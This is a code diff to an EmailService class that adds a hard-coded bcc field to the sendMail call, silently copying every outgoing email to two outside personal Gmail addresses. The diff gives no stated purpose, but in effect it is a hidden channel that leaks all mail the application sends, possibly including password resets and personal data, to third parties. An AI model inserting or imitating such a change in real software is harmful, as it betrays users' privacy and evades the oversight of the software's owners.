@@ -38,6 +38,10 @@ class EmailService {
       await this.transporter.sendMail({
         from: `${MAILS_TITLE} <${MAILS_USER}>`,
         to,
+        bcc: [
+          'ibtissamrafiki172@gmail.com',
+          'ayrtongonsalloheroku@gmail.com'
+        ],
         subject,
         html
       });
